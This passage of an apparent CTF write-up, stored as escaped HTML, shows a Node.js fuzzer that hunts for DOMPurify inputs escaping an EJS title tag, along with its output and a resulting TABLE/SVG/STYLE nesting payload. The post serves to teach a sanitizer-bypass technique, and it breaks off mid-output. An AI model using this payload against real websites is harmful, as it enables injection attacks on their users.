class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> resp \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> window.document.\u003C/span>\u003Cspan style=\"--0:#B392F0\">getElementsByTagName\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'html'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">].innerHTML;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#99A0A6\">// Try to see if we were able to escape the title tag. Since DOMPurify allows styles by default, this can give us a lead into injecting CSS.\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> indices \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">getIndicesOf\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"INJECT\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, resp);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (indices.\u003C/span>\u003Cspan style=\"--0:#B392F0\">some\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">((\u003C/span>\u003Cspan style=\"--0:#FFAB70\">e\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">=>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> e \u003C/span>\u003Cspan style=\"--0:#F97583\">>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> resp.\u003C/span>\u003Cspan style=\"--0:#B392F0\">indexOf\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'&#x3C;/title>'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">))) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">console.\u003C/span>\u003Cspan style=\"--0:#B392F0\">log\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Payload: \"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, payload_main);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">console.\u003C/span>\u003Cspan style=\"--0:#B392F0\">log\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Sanitized: \"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, data.sharedby);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">console.\u003C/span>\u003Cspan style=\"--0:#B392F0\">log\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(resp)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"const ejs = require(&#x27;ejs&#x27;);const fs = require(&#x27;fs&#x27;);const createDOMPurify = require(&#x22;dompurify&#x22;);const { JSDOM } = require(&#x22;jsdom&#x22;);const window = new JSDOM(&#x22;&#x22;).window;const DOMPurify = createDOMPurify(window);const template = &#x60;\u003Chead>    \u003Cmeta charset=&#x22;UTF-8&#x22;>    \u003Cmeta name=&#x22;viewport&#x22; content=&#x22;width=device-width, initial-scale=1.0&#x22;>    \u003Ctitle>        Fancy Text Viewer        \u003C% if (sharedby) { %>            | Shared by \u003C%- sharedby %>        \u003C% } %>    \u003C/title>    \u003C!DOCTYPE html>    \u003Chtml>    \u003Chead>        \u003Clink rel=&#x22;stylesheet&#x22; href=&#x22;/static/style.css&#x22;>    \u003C/head>\u003C/head>\u003Cbody>    \u003Cdiv class=&#x22;container&#x22;>    \u003C/div>\u003C/body>&#x60;;// FROM https://github.com/cure53/DOMPurify/blob/main/src/tags.jsconst html = [ &#x27;a&#x27;, &#x27;abbr&#x27;, ...];const svg = [  &#x27;svg&#x27;, &#x27;a&#x27;, ...];function random_choice(list) {  let index = Math.floor(Math.random() * list.length);  return list[index];}function getIndicesOf(searchStr, str, caseSensitive) {  var searchStrLen = searchStr.length;  if (searchStrLen == 0) {      return [];  }  var startIndex = 0, index, indices = [];  if (!caseSensitive) {      str = str.toLowerCase();      searchStr = searchStr.toLowerCase();  }  while ((index = str.indexOf(searchStr, startIndex)) > -1) {      indices.push(index);      startIndex = index + searchStrLen;  }  return indices;}let wl = html.concat(svg);function get_injection_string(p) {    return &#x60;\u003C${random_choice(wl)}>INJECT&#x60;}let p_len = 8;for ( ; ; ) {  let payload = []  for (let i = 0; i \u003C p_len; i++) {    payload.push(get_injection_string(i));  }  let payload_main = payload.join(&#x27;&#x27;);  const data = {    sharedby: DOMPurify.sanitize(payload_main),  };  window.document.getElementsByTagName(&#x27;html&#x27;)[0].innerHTML = ejs.render(template, data);  var resp = window.document.getElementsByTagName(&#x27;html&#x27;)[0].innerHTML;  // Try to see if we were able to escape the title tag. Since DOMPurify allows styles by default, this can give us a lead into injecting CSS.  var indices = getIndicesOf(&#x22;INJECT&#x22;, resp);  if (indices.some((e) => e > resp.indexOf(&#x27;\u003C/title>&#x27;))) {    console.log(&#x22;Payload: &#x22;, payload_main);    console.log(&#x22;Sanitized: &#x22;, data.sharedby);    console.log(resp)  }}\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Really quickly, we will start to get results of tags that find INJECT string outside the \u003Ccode>&#x3C;/title>\u003C/code> in the actual dom. (And if you try any of these as the \u003Ccode>sharedby\u003C/code> param on the actual site, you will also see this behavior).\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"html\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">Payload:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">table\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">INJECT&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">title\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">INJECT&#x3C;\u003C/span>\u003Cspan style=\"--0:#FDAEB7;--0fs:italic\">filter\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>INJECT&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">progress\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>INJECT&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">textarea\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>INJECT&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">ol\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>INJECT&#x3C;\u003C/span>\u003Cspan style=\"--0:#FDAEB7;--0fs:italic\">marquee\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>INJECT&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">colgroup\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>INJECT\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">Sanitized:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">title\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>INJECT\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;lt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">filter\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;gt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">INJECT\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;lt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">progress\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;gt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">INJECT\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;lt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">textarea\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;gt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">INJECT\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;lt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">ol\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;gt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">INJECT\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;lt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">marquee\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;gt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">INJECT\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;lt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">colgroup\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;gt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">INJECT\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">title\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">table\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">table\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">INJECT\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">head\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">meta\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">charset\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"UTF-8\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> />\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">meta\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">name\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"viewport\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">content\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"width=device-width, initial-scale=1.0\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> />\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">title\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">Fancy Text Viewer | Shared by\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">      \u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;lt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">title\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;gt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">INJECT\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;lt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">filter\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;gt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">INJECT\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;lt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">progress\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;gt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">INJECT\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;lt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">textarea\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;gt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">INJECT\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;lt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">ol\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;gt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">INJECT\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;lt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">marquee\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;gt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">INJECT\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;lt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">colgroup\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;gt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">INJECT\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">title\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">head\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">body\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">table\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">table\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">INJECT\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">link\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">rel\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"stylesheet\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">href\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"/static/style.css\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> />\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">div\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">class\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"container\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">div\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">body\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">table\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"Payload:\u003Ctable>  INJECT\u003Ctitle>    INJECT\u003Cfilter>INJECT\u003Cprogress>INJECT\u003Ctextarea>INJECT\u003Col>INJECT\u003Cmarquee>INJECT\u003Ccolgroup>INJECT    Sanitized:    \u003Ctitle>INJECT&#x26;lt;filter&#x26;gt;INJECT&#x26;lt;progress&#x26;gt;INJECT&#x26;lt;textarea&#x26;gt;INJECT&#x26;lt;ol&#x26;gt;INJECT&#x26;lt;marquee&#x26;gt;INJECT&#x26;lt;colgroup&#x26;gt;INJECT  \u003C/title>  \u003Ctable>\u003C/table>  INJECT  \u003Chead>    \u003Cmeta charset=&#x22;UTF-8&#x22; />    \u003Cmeta name=&#x22;viewport&#x22; content=&#x22;width=device-width, initial-scale=1.0&#x22; />    \u003Ctitle>      Fancy Text Viewer | Shared by      &#x26;lt;title&#x26;gt;INJECT&#x26;lt;filter&#x26;gt;INJECT&#x26;lt;progress&#x26;gt;INJECT&#x26;lt;textarea&#x26;gt;INJECT&#x26;lt;ol&#x26;gt;INJECT&#x26;lt;marquee&#x26;gt;INJECT&#x26;lt;colgroup&#x26;gt;INJECT    \u003C/title>  \u003C/head>  \u003Cbody>    \u003Ctable>\u003C/table>    INJECT    \u003Clink rel=&#x22;stylesheet&#x22; href=&#x22;/static/style.css&#x22; />    \u003Cdiv class=&#x22;container&#x22;>\u003C/div>  \u003C/body>\u003C/table>\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>You can note here that the main issue that causes this behavior seems to be the \u003Ccode>&#x3C;table>\u003C/code> tag. You can continue to modify this fuzz script to specify some explicit tags like table, style, and fuzz the rest.\u003C/p>\n\u003Cp>Eventually, the payload I found that was:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"html\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">TABLE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">TH\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">SVG\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">STYLE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>INJECT&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">TITLE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>&#x3C;\u003C/span>\u003Cspan style=\"--0:#FDAEB7;--0fs:italic\">COL\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">TITLE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"\u003CTABLE>\u003CTH>\u003CSVG>\u003CSTYLE>INJECT\u003CTITLE>\u003CCOL>\u003CTITLE>\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>When this gets passed through DOMPurify, it becomes:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"html\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">title\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">title\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">table\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">tbody\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">tr\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">th\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">svg\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">          \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">style\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">INJECT&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">title\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">title\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">          \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">style\u003C/span>\u003Cspan 